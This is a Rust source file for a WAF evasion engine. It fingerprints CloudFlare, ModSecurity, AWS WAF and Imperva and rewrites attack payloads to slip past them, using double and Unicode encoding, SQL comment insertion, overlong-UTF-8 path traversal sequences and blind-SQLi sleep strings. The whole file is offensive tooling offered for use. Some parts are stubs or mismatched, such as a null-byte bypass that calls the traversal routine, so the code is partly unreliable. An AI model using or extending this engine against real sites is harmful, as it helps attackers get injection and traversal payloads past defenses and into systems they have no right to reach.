use std::collections::HashMap;

/// Advanced WAF/IPS evasion techniques beyond basic payload mutation
pub struct EvasionEngine {
    techniques: Vec<EvasionTechnique>,
    waf_profiles: HashMap<String, WafProfile>,
}

#[derive(Debug, Clone)]
pub enum EvasionTechnique {
    ProtocolLevel,
    EncodingBypass,
    CaseRandomization,
    CommentInjection,
    WhitespaceVariation,
    PathTraversalUnicode,
    TimeDelay,
    Fragmentation,
    HeaderInjection,
    JsonBypass,
    XmlBypass,
    MultipartBypass,
}

#[derive(Debug, Clone)]
pub struct WafProfile {
    pub name: String,
    pub known_bypasses: Vec<String>,
    pub detection_patterns: Vec<String>,
    pub blocked_chars: Vec<char>,
    pub max_payload_size: usize,
    pub case_sensitive: bool,
}

impl EvasionEngine {
    pub fn new() -> Self {
        let mut engine = Self {
            techniques: Vec::new(),
            waf_profiles: HashMap::new(),
        };
        
        engine.load_default_techniques();
        engine.load_waf_profiles();
        
        engine
    }

    fn load_default_techniques(&mut self) {
        self.techniques = vec![
            EvasionTechnique::ProtocolLevel,
            EvasionTechnique::EncodingBypass,
            EvasionTechnique::CaseRandomization,
            EvasionTechnique::CommentInjection,
            EvasionTechnique::WhitespaceVariation,
            EvasionTechnique::PathTraversalUnicode,
            EvasionTechnique::TimeDelay,
            EvasionTechnique::Fragmentation,
            EvasionTechnique::HeaderInjection,
            EvasionTechnique::JsonBypass,
            EvasionTechnique::XmlBypass,
            EvasionTechnique::MultipartBypass,
        ];
    }

    fn load_waf_profiles(&mut self) {
        // CloudFlare profile
        self.waf_profiles.insert("cloudflare".to_string(), WafProfile {
            name: "CloudFlare".to_string(),
            known_bypasses: vec![
                "@transforms/".to_string(),
                "case mixing".to_string(),
                "unicode normalization".to_string(),
            ],
            detection_patterns: vec![
                "cf-ray".to_string(),
                "__cfduid".to_string(),
            ],
            blocked_chars: vec!['<', '>', '"', '\''],
            max_payload_size: 8192,
            case_sensitive: false,
        });

        // ModSecurity profile
        self.waf_profiles.insert("modsecurity".to_string(), WafProfile {
            name: "ModSecurity".to_string(),
            known_bypasses: vec![
                "null byte injection".to_string(),
                "comment obfuscation".to_string(),
                "backslash line continuation".to_string(),
            ],
            detection_patterns: vec![
                "mod_security".to_string(),
                "ModSecurity".to_string(),
            ],
            blocked_chars: vec![';', '(', ')', '"'],
            max_payload_size: 4096,
            case_sensitive: true,
        });

        // AWS WAF profile
        self.waf_profiles.insert("aws-waf".to_string(), WafProfile {
            name: "AWS WAF".to_string(),
            known_bypasses: vec![
                "body compression".to_string(),
                "chunked encoding".to_string(),
            ],
            detection_patterns: vec![
                "awselb".to_string(),
                "aws-waf".to_string(),
            ],
            blocked_chars: vec!['<', '>'],
            max_payload_size: 10240,
            case_sensitive: false,
        });

        // Imperva/Incapsula profile
        self.waf_profiles.insert("imperva".to_string(), WafProfile {
            name: "Imperva".to_string(),
            known_bypasses: vec![
                "double encoding".to_string(),
                "utf-16 encoding".to_string(),
            ],
            detection_patterns: vec![
                "incap_ses".to_string(),
                "visid_incap".to_string(),
            ],
            blocked_chars: vec!['<', '>', '"', '\''],
            max_payload_size: 4096,
            case_sensitive: false,
        });
    }

    /// Apply evasion technique to payload
    pub fn evade(&self, payload: &str, technique: &EvasionTechnique) -> String {
        match technique {
            EvasionTechnique::ProtocolLevel => self.protocol_evasion(payload),
            EvasionTechnique::EncodingBypass => self.encoding_evasion(payload),
            EvasionTechnique::CaseRandomization => self.case_randomization(payload),
            EvasionTechnique::CommentInjection => self.comment_injection(payload),
            EvasionTechnique::WhitespaceVariation => self.whitespace_variation(payload),
            EvasionTechnique::PathTraversalUnicode => self.unicode_traversal(payload),
            EvasionTechnique::TimeDelay => self.time_delay_evasion(payload),
            EvasionTechnique::Fragmentation => self.fragmentation(payload),
            EvasionTechnique::HeaderInjection => self.header_injection(payload),
            EvasionTechnique::JsonBypass => self.json_bypass(payload),
            EvasionTechnique::XmlBypass => self.xml_bypass(payload),
            EvasionTechnique::MultipartBypass => self.multipart_bypass(payload),
        }
    }

    /// Protocol-level evasion (HTTP/1.0, HTTP/2, different methods)
    fn protocol_evasion(&self, payload: &str) -> String {
        // Use alternate HTTP methods or protocol versions
        // This affects how the request is sent, not the payload itself
        payload.to_string()
    }

    /// Advanced encoding evasion
    fn encoding_evasion(&self, payload: &str) -> String {
        let mut result = payload.to_string();
        
        // Double URL encoding
        result = result.replace("%", "%25");
        
        // Unicode encoding
        result = result.chars()
            .map(|c| format!("%u{:04x}", c as u32))
            .collect();
        
        result
    }

    /// Random case variation
    fn case_randomization(&self, payload: &str) -> String {
        use std::time::{SystemTime, UNIX_EPOCH};
        let seed = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_default()
            .as_nanos() as u64;
        
        payload.chars()
            .enumerate()
            .map(|(i, c)| {
                let should_upper = ((seed >> i) & 1) == 1;
                if should_upper { c.to_ascii_uppercase() } else { c.to_ascii_lowercase() }
            })
            .collect()
    }

    /// SQL comment injection evasion
    fn comment_injection(&self, payload: &str) -> String {
        let comments = vec!["/**/", "/*!", "/*!50000", "--", "#"];
        let mut result = payload.to_string();
        
        // Insert comments at strategic positions
        for (i, comment) in comments.iter().enumerate() {
            if i < payload.len() && i % 3 == 0 {
                let pos = i.max(1).min(payload.len() - 1);
                result.insert_str(pos, comment);
            }
        }
        
        result
    }

    /// Whitespace variation using non-standard characters
    fn whitespace_variation(&self, payload: &str) -> String {
        let ws_chars = vec![
            "%20", "%09", "%0a", "%0d", "%0b", "%0c",
            "%a0", // Non-breaking space
            "%c2%a0", // UTF-8 NBSP
        ];
        
        let mut result = payload.to_string();
        let mut idx = 0;
        
        for (i, _) in payload.chars().enumerate() {
            if payload.chars().nth(i) == Some(' ') {
                let ws = ws_chars[idx % ws_chars.len()];
                result = result.replacen(" ", ws, 1);
                idx += 1;
            }
        }
        
        result
    }

    /// Unicode path traversal
    fn unicode_traversal(&self, payload: &str) -> String {
        let traversals = vec![
            "..%c0%af",      // Overlong UTF-8 /
            "..%c1%9c",      // Overlong UTF-8 \
            "..%u2215",      // Unicode /
            "..%u2216",      // Unicode \
            "..%ef%bc%8f",   // Fullwidth /
            "..%ef%bc%bc",   // Fullwidth \
        ];
        
        let mut result = payload.to_string();
        result = result.replace("../", &traversals[0]);
        result = result.replace("..\\", &traversals[1]);
        
        result
    }

    /// Time-delay based evasion (for blind SQLi)
    fn time_delay_evasion(&self, payload: &str) -> String {
        // Alternate time delay functions for different DBs
        let delays = vec![
            "SLEEP(5)",
            "BENCHMARK(10000000,MD5(1))",
            "pg_sleep(5)",
            "WAITFOR DELAY '0:0:5'",
        ];
        
        let mut result = payload.to_string();
        if result.contains("SLEEP") {
            // Already has delay
        } else {
            result.push_str(&format!(" AND {}", delays[0]));
        }
        
        result
    }

    /// Request fragmentation (split payload across multiple requests)
    fn fragmentation(&self, payload: &str) -> String {
        // For fragmentation, we'd need to modify the request sending logic
        // This is a marker that fragmentation should be used
        format!("FRAG:{}:END", payload)
    }

    /// Header injection evasion
    fn header_injection(&self, _payload: &str) -> String {
        // Use HTTP headers to smuggle payload
        // X-Forwarded-For, X-Original-URL, etc.
        "HEADER_INJECTION".to_string()
    }

    /// JSON-based bypass (for JSON endpoints)
    fn json_bypass(&self, payload: &str) -> String {
        // Wrap SQLi in JSON structure
        format!("{{\"id\": 1, \"cmd\": \"{}\"}}", payload.replace("\"", "\\\""))
    }

    /// XML-based bypass (for XML endpoints)
    fn xml_bypass(&self, payload: &str) -> String {
        // CDATA sections, entity encoding
        format!("<![CDATA[{}]]>", payload)
    }

    /// Multipart/form-data bypass
    fn multipart_bypass(&self, payload: &str) -> String {
        // Split payload across multipart boundaries
        format!(
            "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"x\"\r\n\r\n{}\r\n------WebKitFormBoundary--",
            payload
        )
    }

    /// Generate evasion variants for specific WAF
    pub fn generate_waf_specific(&self, payload: &str, waf_name: &str) -> Vec<String> {
        let mut variants = Vec::new();
        
        if let Some(profile) = self.waf_profiles.get(waf_name) {
            println!("[EVASION] Generating {}-specific bypasses", profile.name);
            
            for bypass in &profile.known_bypasses {
                match bypass.as_str() {
                    "case mixing" => variants.push(self.case_randomization(payload)),
                    "null byte injection" => variants.push(self.unicode_traversal(payload)),
                    "double encoding" => variants.push(self.encoding_evasion(payload)),
                    "comment obfuscation" => variants.push(self.comment_injection(payload)),
                    "unicode normalization" => variants.push(self.unicode_traversal(payload)),
                    _ => {}
                }
            }
        }
        
        variants
    }

    /// Detect WAF type from response
    pub fn detect_waf(&self, headers: &HashMap<String, String>, body: &str) -> Option<String> {
        for (name, profile) in &self.waf_profiles {
            for pattern in &profile.detection_patterns {
                if headers.values().any(|v| v.contains(pattern)) ||
                   headers.keys().any(|k| k.contains(pattern)) ||
                   body.contains(pattern) {
                    return Some(name.clone());
                }
            }
        }
        
        None
    }

    /// Get all available techniques
    pub fn get_techniques(&self) -> &[EvasionTechnique] {
        &self.techniques
    }

    /// Get WAF profiles
    pub fn get_waf_profiles(&self) -> &HashMap<String, WafProfile> {
        &self.waf_profiles
    }
}
